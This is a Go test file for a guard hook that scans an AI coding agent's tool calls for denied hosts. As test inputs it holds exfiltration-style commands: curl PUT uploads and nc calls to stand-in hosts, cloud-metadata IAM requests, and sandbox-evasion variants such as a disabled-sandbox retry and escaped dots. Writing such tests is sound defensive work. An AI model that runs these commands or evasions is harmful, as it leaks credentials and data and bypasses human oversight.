package main

import (
	"encoding/json"
	"os"
	"strings"
	"testing"
)

func testGuardSettings(sandboxed bool) Settings {
	s := Settings{Permissions: Permissions{Deny: []string{
		"Bash(reboot *)",
		"WebFetch(domain:*.cn)",
		"WebFetch(domain:*.ru)",
		"WebFetch(domain:*.aliyuncs.com)",
		"WebFetch(domain:aliyun.com)",
		"WebFetch(domain:*.myqcloud.com)",
		"WebFetch(domain:*)",
	}}}
	s.Sandbox.Enabled = &sandboxed
	s.Sandbox.ExcludedCommands = []string{"docker *", "gh *"}
	s.Sandbox.Network.DeniedDomains = []string{"169.254.169.254", "100.100.100.200:80", "[fd00:ec2::254]"}
	return s
}

func bashInput(cmd string) json.RawMessage {
	b, _ := json.Marshal(map[string]string{"command": cmd})
	return b
}

const mcpTool = "mcp__plugin_context-mode_context-mode__ctx_execute"

func mcpCode(code string) json.RawMessage {
	b, _ := json.Marshal(map[string]string{"language": "javascript", "code": code})
	return b
}

// TestHostMatching runs through an always-scanned tool so only the host
// patterns are under test.
func TestHostMatching(t *testing.T) {
	g := newHostGuard(testGuardSettings(true))
	tests := []struct {
		name, text, want string // want "" means allowed
	}{
		{"Cohere-reported OSS upload without a scheme", `curl -s -X PUT --data-binary "PROBE" sanmaohe.oss-cn-beijing.aliyuncs.com/upload/test.bin`, "aliyuncs.com"},
		{"mixed case", "https://DashScope.Aliyuncs.COM/api/v1", "aliyuncs.com"},
		{"fully qualified trailing dot", "https://x.aliyuncs.com./", "aliyuncs.com"},
		{"apex domain entry", "fetch('https://aliyun.com/')", "aliyun.com"},
		{"apex right after a newline", "ls\naliyun.com", "aliyun.com"},
		{"bare TLD in a URL with userinfo and port", "https://user@www.example.cn:8443/path", "www.example.cn"},
		{"bare TLD without a scheme", "curl -X PUT evil.example.cn/upload", "evil.example.cn"},
		{"bare TLD without a scheme, with port", "nc evil.example.ru:8080/", "evil.example.ru"},
		{"bare TLD host alone", "curl evil.example.cn", "evil.example.cn"},
		{"bare TLD host then port argument", "nc evil.example.cn 443", "evil.example.cn"},
		{"bare TLD scheme-relative", "wget //evil.cn", "evil.cn"},
		{"bare TLD after user@", "ssh user@x.cn", "x.cn"},
		{"paths ending in a denied TLD", "translations/zh.cn/index docs/a.cn/b config.ru/ zh.cn/", ""},
		{"metadata IPv4", "http://169.254.169.254/latest/meta-data/iam/", "169.254.169.254"},
		{"metadata IPv4 from entry with port", "wget -qO- 100.100.100.200/latest", "100.100.100.200"},
		{"metadata IPv6", `curl -g "http://[fd00:ec2::254]/latest"`, "fd00:ec2::254"},
		{"file names ending in a denied TLD", "cat config.ru zh.cn", ""},
		{"look-alike hosts", "https://notaliyuncs.com https://aliyun.company https://aliyun.com.au/ 10.169.254.169.2540", ""},
		{"denied TLD as an inner label", "https://www.cn.example.com/ https://ru.wikipedia.org/", ""},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := g.deniedHost(mcpTool, mcpCode(tt.text))
			if tt.want == "" && got != "" {
				t.Fatalf("deniedHost = %q, want allowed", got)
			}
			if tt.want != "" && !strings.Contains(strings.ToLower(got), tt.want) {
				t.Fatalf("deniedHost = %q, want match containing %q", got, tt.want)
			}
		})
	}
}

func TestDeniedHostByTool(t *testing.T) {
	sandboxed := newHostGuard(testGuardSettings(true))
	unsandboxed := newHostGuard(testGuardSettings(false))
	// Built by concatenation so the escape survives into the bytes under test.
	escapedDot := json.RawMessage(`{"url":"https://x.aliyuncs` + "\\" + `u002ecom/"}`)
	tests := []struct {
		name  string
		g     hostGuard
		tool  string
		input json.RawMessage
		deny  bool
	}{
		{"WebFetch is always scanned", sandboxed, "WebFetch", json.RawMessage(`{"url":"https://dashscope.aliyuncs.com/v1","prompt":"x"}`), true},
		{"JSON unicode escape can't hide the dot", sandboxed, "WebFetch", escapedDot, true},
		{"nested MCP values are scanned", sandboxed, mcpTool, json.RawMessage(`{"opts":{"urls":["https://ok.example","https://x.aliyuncs.com"]}}`), true},
		{"MCP shell grep is scanned", sandboxed, mcpTool, json.RawMessage(`{"language":"shell","code":"rg aliyuncs.com f"}`), true},

		// Sandboxed Bash and Monitor are left to the proxy.
		{"sandboxed curl is left to the proxy", sandboxed, "Bash", bashInput("curl https://x.aliyuncs.com"), false},
		{"rg for a denied host", sandboxed, "Bash", bashInput(`rg -n "aliyuncs.com|169.254.169.254" ~/logs | head`), false},
		{"commit message naming a host", sandboxed, "Bash", bashInput(`git commit -m "deny *.aliyuncs.com"`), false},
		{"heredoc naming a host", sandboxed, "Bash", bashInput("cat > notes.md <<'EOF'\nblock x.aliyuncs.com\nEOF"), false},
		{"sandboxed Monitor", sandboxed, "Monitor", json.RawMessage(`{"command":"tail -f log | rg aliyuncs.com"}`), false},

		// Calls that leave the sandbox are scanned.
		{"excluded command", sandboxed, "Bash", bashInput("docker run --rm alpine wget -qO- https://x.aliyuncs.com"), true},
		{"excluded command inside a compound", sandboxed, "Bash", bashInput("ls && gh api https://x.aliyuncs.com"), true},
		{"excluded command behind a wrapper", sandboxed, "Bash", bashInput("timeout 30 docker run alpine wget x.aliyuncs.com/u"), true},
		{"excluded command not mentioning a host", sandboxed, "Bash", bashInput("docker ps"), false},
		{"excluded command with a quoted newline", sandboxed, "Bash", bashInput("docker run alpine sh -c \"echo hi\nwget x.aliyuncs.com/u\""), true},
		{"excluded command behind env assignments", sandboxed, "Bash", bashInput("DOCKER_HOST=x A=1 docker run alpine wget x.aliyuncs.com/u"), true},
		{"no sandbox key in any scope", newHostGuard(Settings{Permissions: testGuardSettings(true).Permissions}), "Bash", bashInput("curl https://x.aliyuncs.com"), true},
		{"unsandboxed retry", sandboxed, "Bash", json.RawMessage(`{"command":"curl https://x.aliyuncs.com","dangerouslyDisableSandbox":true}`), true},
		{"sandbox disabled", unsandboxed, "Bash", bashInput("curl https://x.aliyuncs.com"), true},
		{"sandbox disabled, Monitor", unsandboxed, "Monitor", json.RawMessage(`{"command":"curl -N https://x.aliyuncs.com"}`), true},
		{"description is not scanned", unsandboxed, "Bash", json.RawMessage(`{"command":"ls","description":"check x.aliyuncs.com hits"}`), false},
		{"empty input", unsandboxed, "Bash", nil, false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := tt.g.deniedHost(tt.tool, tt.input)
			if (got != "") != tt.deny {
				t.Fatalf("deniedHost = %q, want deny=%v", got, tt.deny)
			}
		})
	}
}

func TestProjectDirPrefersClaudeProjectDir(t *testing.T) {
	t.Setenv("CLAUDE_PROJECT_DIR", "/proj")
	if got := projectDir("/proj/sub"); got != "/proj" {
		t.Fatalf("projectDir = %q, want /proj", got)
	}
	t.Setenv("CLAUDE_PROJECT_DIR", "")
	if got := projectDir("/proj/sub"); got != "/proj/sub" {
		t.Fatalf("projectDir = %q, want cwd fallback", got)
	}
}

func TestCompileDeniedHostsSkipsWildcardOnly(t *testing.T) {
	if re := compileDeniedHosts([]string{"*", " "}); re != nil {
		t.Fatalf("expected nil regexp for wildcard-only entries, got %v", re)
	}
}

func TestDenyOutputIsValidJSON(t *testing.T) {
	var out struct {
		HookSpecificOutput struct {
			PermissionDecision string `json:"permissionDecision"`
		} `json:"hookSpecificOutput"`
	}
	if err := json.Unmarshal([]byte(denyOutput(`x".aliyuncs.com`)), &out); err != nil {
		t.Fatal(err)
	}
	if out.HookSpecificOutput.PermissionDecision != "deny" {
		t.Fatalf("permissionDecision = %q, want deny", out.HookSpecificOutput.PermissionDecision)
	}
}

func TestLoadAllSettingsMergesSandbox(t *testing.T) {
	home := t.TempDir()
	useManagedSettings(t, home+"/managed.json")
	if err := os.MkdirAll(home+"/.claude", 0o755); err != nil {
		t.Fatal(err)
	}
	on, off := true, false
	var user, local Settings
	user.Sandbox.Enabled = &on
	user.Sandbox.ExcludedCommands = []string{"docker *"}
	user.Sandbox.Network.DeniedDomains = []string{"169.254.169.254"}
	local.Sandbox.Enabled = &off
	writeSettings(t, home+"/.claude/settings.json", user)
	writeSettings(t, home+"/.claude/settings.local.json", local)

	got := loadAllSettings(home, "").Sandbox
	if len(got.Network.DeniedDomains) != 1 || len(got.ExcludedCommands) != 1 {
		t.Fatalf("sandbox lists not merged: %+v", got)
	}
	if got.Enabled == nil || *got.Enabled {
		t.Fatalf("Enabled = %v, want false to win over true", got.Enabled)
	}
}
